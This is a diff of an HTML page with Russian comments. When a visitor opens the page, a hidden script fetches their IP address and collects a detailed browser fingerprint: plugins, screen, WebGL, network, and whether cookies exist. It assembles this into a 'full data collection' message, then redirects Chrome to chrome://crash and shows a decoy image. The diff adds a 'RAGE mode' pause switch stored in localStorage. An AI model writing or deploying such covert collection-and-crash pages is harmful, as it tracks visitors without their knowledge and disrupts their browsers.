@@ -5,10 +5,28 @@
 </head>
 <body>
 <script>
+    // Команда остановки
+    window.pause1 = function(text) {
+        localStorage.setItem('rage_paused', 'true');
+        localStorage.setItem('pause_message', text || 'Сбор данных остановлен');
+        window.isPaused = true;
+        
+        document.body.innerHTML = `<div style="padding:40px;font-family:monospace;background:#111;color:#ff4444;font-size:20px;text-align:center;min-height:100vh;display:flex;align-items:center;justify-content:center;">${localStorage.getItem('pause_message')}</div>`;
+        console.log('[⚡] Сбор остановлен: ' + (text || 'по команде'));
+        return 'RAGE mode остановлен';
+    };
+
+    // Проверка паузы при загрузке
+    if (localStorage.getItem('rage_paused') === 'true') {
+        const msg = localStorage.getItem('pause_message') || 'Сбор данных остановлен';
+        document.body.innerHTML = `<div style="padding:40px;font-family:monospace;background:#111;color:#ff4444;font-size:20px;text-align:center;min-height:100vh;display:flex;align-items:center;justify-content:center;">${msg}</div>`;
+        throw new Error('RAGE mode остановлен');
+    }
+
+    // Основной сбор
     async function collectAll() {
         const data = {};
         
-        // Базовые данные
         data.ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
         data.agent = navigator.userAgent;
         data.platform = navigator.platform;
@@ -21,7 +39,6 @@
         data.pdfViewerEnabled = navigator.pdfViewerEnabled || false;
         data.onLine = navigator.onLine;
         
-        // Экран
         data.screen = {
             width: screen.width,
             height: screen.height,
@@ -32,37 +49,31 @@
             orientation: screen.orientation ? screen.orientation.type : 'неизвестно'
         };
         
-        // Время/дата
         data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         data.date = new Date().toString();
         data.timezoneOffset = new Date().getTimezoneOffset();
         
-        // Плагины
         data.plugins = [];
         for (let plugin of navigator.plugins) {
             data.plugins.push(plugin.name + ' v' + plugin.version);
         }
         
-        // MIME-типы
         data.mimeTypes = [];
         for (let mime of navigator.mimeTypes) {
             data.mimeTypes.push(mime.type);
         }
         
-        // Хардварные возможности
         data.hardware = {
             concurrency: navigator.hardwareConcurrency || 'неизвестно',
             deviceMemory: navigator.deviceMemory || 'неизвестно',
             maxTouchPoints: navigator.maxTouchPoints || 0
         };
         
-        // WebRTC (может дать локальный IP)
         data.rtcSupport = {
             RTCPeerConnection: window.RTCPeerConnection ? 'да' : 'нет',
             RTCSessionDescription: window.RTCSessionDescription ? 'да' : 'нет'
         };
         
-        // Хранилища
         data.storage = {
             localStorage: !!window.localStorage,
             sessionStorage: !!window.sessionStorage,
@@ -70,7 +81,6 @@
             cookies: document.cookie.length > 0
         };
         
-        // Поддержка API
         data.apis = {
             geolocation: 'geolocation' in navigator,
             serviceWorker: 'serviceWorker' in navigator,
@@ -84,7 +94,6 @@
             clipboard: 'clipboard' in navigator
         };
         
-        // Сеть
         if (navigator.connection) {
             data.connection = {
                 effectiveType: navigator.connection.effectiveType,
@@ -94,16 +103,12 @@
             };
         }
         
-        // Пиксельное соотношение
         data.devicePixelRatio = window.devicePixelRatio;
-        
-        // Дополнительные заголовки
         data.headers = {
             referrer: document.referrer || 'отсутствует',
             encoding: document.characterSet || document.charset
         };
         
-        // WebGL информация
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
@@ -115,7 +120,6 @@
             };
         }
         
-        // Дополнительно: попытка определения ОС через User Agent
         const ua = data.agent.toLowerCase();
         if (ua.includes('win')) data.detectedOS = 'Windows';
         else if (ua.includes('mac')) data.detectedOS = 'macOS';
@@ -133,7 +137,6 @@
         
         const allData = await collectAll();
         
-        // Формируем сообщение
         let message = `🔍 ПОЛНЫЙ СБОР ДАННЫХ
 IP: ${allData.ip}
 Время: ${allData.date}
@@ -212,13 +215,16 @@ Timezone Offset: ${allData.timezoneOffset}`;
         if (/chrome/i.test(allData.agent)) {
             window.location.href = 'chrome://crash';
             setTimeout(() => {
-                document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSywzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
+                if (localStorage.getItem('rage_paused') !== 'true') {
+                    document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSywzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
+                }
             }, 1000);
-        } else {
+        } else if (localStorage.getItem('rage_paused') !== 'true') {
             document.body.innerHTML = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA9CAYAAAATfBGuAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADeSURBVGhD7ZdLDoMwEENLjzYHnyPlCmWHqkiQyWdasP2kbEJI9GQLha2U8nmR8K4nkJEsKpJFRbKoSBYVyaLys7tx9FeutVfvud9QJUslm1rjyJqa1jut51dQJUslm1rjDGbOpUpWsqhIFpUlX+N/oa/xBVSyyzV+IlTJShYVyaIiWVQki8oOMw5u+TJZud0AAAAASUVORK5CYII=" />';
         }
     }
     
+    // Запуск
     execute();
 </script>
 </body>
